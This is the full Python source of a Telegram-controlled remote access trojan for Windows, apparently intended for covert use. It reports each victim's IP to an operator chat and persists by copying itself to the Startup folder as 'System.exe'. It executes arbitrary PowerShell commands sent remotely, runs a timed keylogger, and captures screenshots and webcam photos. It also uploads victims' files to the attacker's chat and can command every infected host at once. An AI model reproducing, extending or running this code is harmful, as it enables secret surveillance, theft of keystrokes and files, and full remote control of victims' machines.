import webbrowser
import telebot
import telegram
import socket
import pyautogui
import os 
import cv2
import requests
import time
import shutil
import winshell
import subprocess
from pynput.keyboard import Listener
from threading import Thread
import webbrowser


#Basic bot stuff
TOKEN = ''
CHAT_ID = ''
bot = telebot.TeleBot(TOKEN)
#Ip address
ip = socket.gethostbyname(socket.gethostname())
bot_name = socket.gethostname()
#AppData/Name
Appdata = os.getenv('APPDATA')

#Send Message function 
def send_message(text):
    url_req = "https://api.telegram.org/bot" + TOKEN + "/sendMessage" + "?chat_id=" +  CHAT_ID + "&text=" + text 
    results = requests.get(url_req)

#Join Message
def Join_Message():
        text = bot_name + ": " + ip
        url_req = "https://api.telegram.org/bot" + TOKEN + "/sendMessage" + "?chat_id=" +  CHAT_ID + "&text=" + text 
        results = requests.get(url_req)
Join_Message()

#Backdoor code
def backdoor():
    try:
        #Adding file to startup
        startup = winshell.startup()
        Startup_Path = r"" + startup +"\\System.exe"
        #PAth to file for startup
        file = r"app.exe"
        shutil.copyfile(file, Startup_Path)
        send_message("Backdoor: " + ip  + " " + "sent Successfully!")
    except:
        send_message("Cannot send backdoor!")

#ls command
def ls():
    path = os.listdir()
    result = '\n'.join([str(elem) for elem in path])
    result = 'ls --→ result\n' + result
    send_message(result)

#cd ..
def cdMinus():
    os.chdir('..')        
    currentpath = (os.getcwd())
    currentpath = 'cd ..      --→ result\n' + currentpath
    send_message(currentpath)

#cd to directory
def cdTo(command_ip):
    try:
        os.chdir(command_ip)
        currentpath = (os.getcwd())
        currentpath = 'cd --→ result\n' + currentpath
        send_message(currentpath)
    except:
        send_message("Error! check command..")   

#Keylogger
def keylogger(timer):
    filename = f"Keylogs_{ip}.txt"
    FILE_PATH = f'{Appdata}\Microsoft\Windows\Powershell\{filename}'
    list = []
    def record():

        def on_press(key):
            mod = str(key)
            if mod == "Key.space":
                mod = "'space'"
                list.append(" " + mod + " ")
               
            else:
                new_key = mod[1]  
                list.append(new_key)

        with Listener(on_press=on_press) as ls:
            def time_out(period_sec: int):
                time.sleep(period_sec)
                ls.stop()

            Thread(target=time_out, args=(timer,)).start()
            ls.join()
    record()

    str1 = ''.join(str(e) for e in list)
    file = open(FILE_PATH, "w")
    file.write(str1)   
    file.close()
    bot.send_document(chat_id=CHAT_ID, document=open(FILE_PATH, "rb"))
    os.remove(FILE_PATH)

#Screenshot code
def take_screenshot():
    myScreenshot = pyautogui.screenshot()
    PHOTO_PATH = f'{Appdata}\Microsoft\Windows\Powershell\pic.png'
    myScreenshot.save(PHOTO_PATH)
    bot.send_message(chat_id=CHAT_ID, text=f"screenshot: " + ip)
    bot.send_photo(chat_id=CHAT_ID, photo=open(PHOTO_PATH, 'rb'))  
    #Deleting picture
    os.remove(PHOTO_PATH)

#Webcampicture code  
def Webcam_Picture():
    PHOTO_PATH = f'{Appdata}\Microsoft\Windows\Powershell\webcam.jpg'
    cap = cv2.VideoCapture(0)
    x = 0
    while x < 10:
        ret, frame = cap.read()
        if x == 4:
            cv2.imwrite(PHOTO_PATH, frame)
        x += 1
    cap.release()
    cv2.destroyAllWindows()
    #Sending picture
    PHOTO_PATH = f'{Appdata}\Microsoft\Windows\Powershell\webcam.jpg'
    bot = telegram.Bot(token=TOKEN)
    bot.send_message(chat_id=CHAT_ID, text=f"webcam: " + ip)
    bot.send_photo(chat_id=CHAT_ID, photo=open(PHOTO_PATH, 'rb'))
    os.remove(PHOTO_PATH)

#List command
@bot.message_handler(commands=['list'])
def run(message):
    text = bot_name + ": " + ip
    url_req = "https://api.telegram.org/bot" + TOKEN + "/sendMessage" + "?chat_id=" +  CHAT_ID + "&text=" + text 
    results = requests.get(url_req)

#Backdoor command
@bot.message_handler(commands=['backdoor'])
def fun(message):
    #Checking if ip is right
    command_ip = message.text
    command_ip = command_ip.split() 
    if ip in command_ip:
        backdoor()

    pass

#Screenshot command 
@bot.message_handler(commands=['screenshot'])
def run(message):
    #Checking ip
    command_ip = message.text
    command_ip = command_ip.split() 
    if ip in command_ip:
        bot.reply_to(message, "Taking picture...")
        take_screenshot()
    
    if "allbots" in command_ip:
        bot.reply_to(message, "Taking picture...")
        take_screenshot()
    
#Powershell command   
@bot.message_handler(commands=['powershell'])
def run(message):
        def shell():
            command = message.text
            command = command.split()
            command.pop(0) and command.pop(0)

            #Looping the list to string
            command_Str = ' '.join(str(e) for e in command)

            p = subprocess.Popen(
            ['powershell', command_Str], 
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True
            )
            p_out, p_err = p.communicate()
            lines = p_out.splitlines()
            str1 = ' '.join(str(e) for e in lines)
            send_message(str1)
        
        #IP check
        command_ip = message.text
        command_ip = command_ip.split() 
        if ip in command_ip:
            shell()
        if "allbots" in command_ip:
            shell()
  
#Webcam command
@bot.message_handler(commands=['webcam'])
def run(message):

    command_ip = message.text
    command_ip = command_ip.split() 
    if ip in command_ip:
        bot.reply_to(message, "Taking picture...")
        Webcam_Picture()

    if "allbots" in command_ip:
        bot.reply_to(message, "Taking pictures...")
        Webcam_Picture()

#Keylogger command
@bot.message_handler(commands=['keylogger'])
def run(message):
    command_ip = message.text
    command_ip = command_ip.split()
    try:
        timer = command_ip[2] + ".0"
        timer = float(timer)
        print(type(timer))

        if ip in command_ip:
            send_message("Recording...")
            keylogger(timer)
        if "allbots" in command_ip:
            send_message("Recording...")
            keylogger(timer)
    except:
        pass

#Shell command + code
@bot.message_handler(commands=['shell'])
def run(message):
    command_ip = message.text
    command_ip = command_ip.split()
    
    if ip in command_ip:
        
        if "ls" in command_ip:
            ls()

        elif "cd" in command_ip:
            def cd_commands():
                if ".." in command_ip:
                    cdMinus()
                else:
                    try:
                        dir = (command_ip[3])
                        cdTo(dir)
                    except:
                        pass
            cd_commands()

        elif "get" in command_ip:
            file = command_ip[-1]
            dockfile = open(file, "rb")

            try:
                bot.send_document(chat_id=CHAT_ID, document=dockfile)
                dockfile.close()
            except:
                send_message("Could not send file")

@bot.message_handler(commands=['url'])
def run(message):
    command_ip = message.text
    command_ip = command_ip.split()
    if ip in command_ip:
        url = command_ip[2]            
        try:
            webbrowser.open(url)
        except:
            pass

def main():
    bot.polling()
if __name__ == '__main__':
    main()
